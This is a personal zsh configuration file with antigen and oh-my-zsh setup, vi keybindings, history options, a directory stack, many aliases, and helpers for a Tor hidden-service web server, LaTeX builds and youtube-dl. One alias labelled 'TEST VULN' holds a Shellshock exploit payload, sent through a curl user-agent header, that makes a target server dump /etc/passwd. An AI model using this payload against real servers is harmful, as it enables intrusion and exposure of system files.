source /usr/share/zsh/scripts/antigen/antigen.zsh

antigen use oh-my-zsh

antigen bundle git

antigen theme dstufft01

antigen apply

#TEMP WORKAROUND
cd $HOME

zstyle ':completion:::*:default' menu no select list-colors ${(s.:.)LS_COLORS}
zstyle :compinstall filename '/home/francesco/.zshrc'

autoload -Uz compinit promptinit colors
autoload -U run-help
autoload run-help-git
alias help=run-help

autoload -Uz up-line-or-beginning-search
zle -N up-line-or-beginning-search
autoload -Uz down-line-or-beginning-search
zle -N down-line-or-beginning-search

compinit
promptinit
colors

#history options
setopt hist_allow_clobber
setopt hist_ignore_dups
setopt hist_ignore_space
setopt hist_no_store
setopt hist_expire_dups_first
setopt hist_find_no_dups
setopt extended_history
setopt inc_append_history

HISTFILE=~/.histfile
HISTSIZE=50000
SAVEHIST=50000


unsetopt beep
unsetopt global_rcs


bindkey -v
export KEYTIMEOUT=1

typeset -A key

key[Home]=${terminfo[khome]}
key[End]=${terminfo[kend]}
key[Insert]=${terminfo[kich1]}
key[Delete]=${terminfo[kdch1]}
key[Up]=${terminfo[kcuu1]}
key[Down]=${terminfo[kcud1]}
key[Left]=${terminfo[kcub1]}
key[Right]=${terminfo[kcuf1]}
key[PageUp]=${terminfo[kpp]}
key[PageDown]=${terminfo[knp]}

# setup key according to my Italian Keyboard
[[ -n "${key[Home]}"    ]]  && bindkey  "${key[Home]}"    beginning-of-line
[[ -n "${key[End]}"     ]]  && bindkey  "${key[End]}"     end-of-line
[[ -n "${key[Insert]}"  ]]  && bindkey  "${key[Insert]}"  overwrite-mode
[[ -n "${key[Delete]}"  ]]  && bindkey  "${key[Delete]}"  delete-char
#[[ -n "${key[Up]}"      ]]  && bindkey  "${key[Up]}"	  history-beginning-search-backward
#[[ -n "${key[Down]}"    ]]  && bindkey  "${key[Down]}"   history-beginning-search-forward
[[ -n "${key[Up]}"      ]]  && bindkey  "${key[Up]}"	  history-search-backward
[[ -n "${key[Down]}"    ]]  && bindkey  "${key[Down]}"   history-search-forward
[[ -n "${key[Left]}"    ]]  && bindkey  "${key[Left]}"   backward-char
[[ -n "${key[Right]}"   ]]  && bindkey  "${key[Right]}"  forward-char



# Searching autocompl using <Ctrl>j/k
bindkey -M vicmd 'j' down-line-or-beginning-search
bindkey -M vicmd 'k' up-line-or-beginning-search

bindkey '\eOA' up-line-or-beginning-search
bindkey '\e[A' up-line-or-beginning-search
bindkey '\eOB' down-line-or-beginning-search
bindkey '\e[B' down-line-or-beginning-search
bindkey '^k' up-line-or-beginning-search
bindkey '^j' down-line-or-beginning-search


# Finally, make sure the terminal is in application mode, when zle is
# # active. Only then are the values from $terminfo valid.

function zle-line-init zle-keymap-select {
    RPS1="${${KEYMAP/vicmd/ [NORMAL]}/(main|viins)/[INSERT]}"
    RPS2=$RPS1
    zle reset-prompt
}


zle -N zle-line-init
zle -N zle-keymap-select


#DIRSTACK CONF
DIRSTACKFILE="$HOME/.cache/zsh/dirs"
if [[ -f $DIRSTACKFILE ]] && [[ $#dirstack -eq 0 ]]; then
	   dirstack=( ${(f)"$(< $DIRSTACKFILE)"} )
	     [[ -d $dirstack[1] ]] && cd $dirstack[1]
fi
chpwd() {
   print -l $PWD ${(u)dirstack} >$DIRSTACKFILE
}

DIRSTACKSIZE=20
setopt autopushd pushdsilent pushdtohome
## Remove duplicate entries
setopt pushdignoredups
### This reverts the +/- operators.
setopt pushdminus



alias docker='sudo docker'
alias ..='cd ..'
alias c='clear'
alias mount='mount |column -t'
alias h='history'
alias now='date +"%T"'
alias ls='ls --color=auto'
alias ll='ls -i -lF --color=auto'
alias la='ls -i'
alias lla='ls -la -i'
alias vimtest='vim -u ~/.vimrctest'
alias gvimtest='gvim -u ~/.vimrctest'
alias gvim='gvim -geometry 55x39'
alias pingg='ping -c 3 www.google.com'
alias ffox='firefox'
alias httppingg='curl -I http://google.com/ > /dev/null 2>&1 && echo success || echo failure'
alias lock-screen='xscreensaver-command -lock'
alias i3lock='i3lock -c 000000 -n'
alias xtime='date +%T'
alias mountt='sudo mount -t ntfs-3g $1 $2'
alias ntpsync='ntpdate -q 0.rhel.pool.ntp.org'
alias reboot='sudo systemctl reboot'
alias suspend='sudo systemctl suspend'
alias poweroff='sudo systemctl poweroff'
alias myip='curl ifconfig.me'
alias netctl-current='netctl list | grep "*"'
alias py2=python2.7
alias py3=python3
alias eclipse='eclipse -vmargs -Xmx1024M'
alias tmux='tmux -2'
alias tma='tmux attach -d -t'
alias git-tmux='tmux new -s $(basename $(pwd))'
alias nopaste="curl -F 'sprunge=<-' http://sprunge.us"
#alias openstack-compute='qemu-system-x86_64 -enable-kvm -hda ~/VMs/ubuntu_compute.img -m 2048 -cpu host &'
alias rss='newsbeuter -r'
alias reddit='rtv'

#TEST VULN
alias vuln="curl -A '() { :; }; /bin/cat /etc/passwd > dumped_file' $1"

#alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /srv/http/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"

export SSH_ASKPASS=''
export VISUAL="vim"
export EDITOR="vim"
export BROWSER=w3m
export GOPATH=$HOME/golang-book
export PATH="$PATH:$HOME/.gem/ruby/2.2.0/bin":$GOPATH/bin


#MY OLD BASHRC CONFIG FUNCTs
tl() {
	if [[ -z "$1" ]]; then
		task list && task summary
	else
		task list project:$1 && task summary project:$1
	fi
}


# ** TOR HIDDEN SERVICE **
alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /var/lib/tor/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"
function hiddensrv-stop(){
	pid=$(pgrep thttpd)
	if [ "$pid" == ""  ]; then
		echo "[thttpd] Service not running"
	else
		echo "[thttpd] Stop: $pid"
		sudo kill -9 $pid
	fi
}


#LATEX ALIASes
function texbuild(){
	filename=$(basename "$1")
	extension="${filename##*.}"
	filename="${filename%.*}"
	if [ -f "$1" ]; then
		latex $filename
		latex $filename
		echo "Making dvi.."
		dvips $filename.dvi #-o $filename.ps
		echo "Making ps.."
		ps2pdf $filename.ps
		echo "Making pdf"
		rm *.log *.ps *.dvi *.out *.aux
		#evince $filename.pdf
	fi
}

function ytdownload(){
	if [[ -z "$1" ]]; then
		echo "Usage:  ytdownload <URL>"
	else
		echo "[Retrieving media]"
		youtube-dl -x --audio-format mp3 $1 -o  $MUSIC_DIR'%(title)s.%(ext)s'
		#echo "Updating mpc"
		#mpc update
	fi
}

setup_tmux_layout() {
	# Create a new window.
	tmux new-window -a -n '$1'
        # Now split it twice, first horizontally and then  vertically.
        tmux split-window -h
        tmux split-window -v
}
